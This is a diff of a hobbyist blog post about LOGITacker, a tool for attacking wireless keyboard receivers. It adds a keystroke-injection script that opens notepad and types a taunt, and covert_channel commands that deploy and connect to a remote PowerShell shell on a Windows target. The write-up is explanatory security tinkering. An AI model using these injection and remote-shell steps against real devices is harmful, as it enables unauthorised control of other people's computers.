@@ -56,7 +56,7 @@ usb.generic.allowLastHID = "TRUE"
 
 You can now selectively attach the stuff to your VM:  
 
-<img src="/images/2021-05-15/usb.png">
+<img src="/images/2021-05-15/usb.PNG">
 
 The MDK Dongle in my case was already shipped with the newest UF2 bootloader, which will just present you with a flash drive when started in flash mode, to which you can copy the uf2 file. Any further info can be found [here](https://wiki.makerdiary.com/nrf52840-mdk-usb-dongle/programming/).   
 To start the flashmode, hold down the small black button of the device, holding it down while plugging it in. The flashing red light indicates you´re in flashmode.  
@@ -168,6 +168,32 @@ And verify with:
 
 <img src="/images/2021-05-15/17.png">
 
+Next we can build a script like so:  
+```
+script press GUI r
+script delay 500
+script string notepad.exe
+script press ENTER
+script delay 200
+script string you got p0wned!
+script store test
+```
+
+Now running ```script list``` should show our "test" script:  
+
+<img src="/images/2021-05-15/18.png">
+
+With ```script show``` we can verify the content of our currently loaded script:  
+
+<img src="/images/2021-05-15/script.png">
+
+To execute the script use:  
+
+``` inject execute```
+
+<img src="/images/2021-05-15/p0wned.png">
+
+To see the speed of the injected characters I made a small video:  
 
 <video muted autoplay controls>
     <source src="/images/2021-05-15/inject.mp4" type="video/mp4">
@@ -176,3 +202,14 @@ And verify with:
 <video width="600" controls="controls">
   <source src="/images/2021-05-15/inject.mp4">
 </video>
+
+One of the cool features of LOGITacker is the ```covert_channel``` option, which will give you a remote shell on a Windows box.  
+One first has to deploy the shell to a target and then connect to the shell in the next step:  
+
+```covert_channel deploy YOUR_TARGET```
+
+This will, as far as I understood, deploy posh funcionality (SSH for Powershell) to the attacked device and lets you connect 
+
+```covert_channel connect YOUR_TARGET```
+
+<img src="/images/2021-05-15/shell.png">
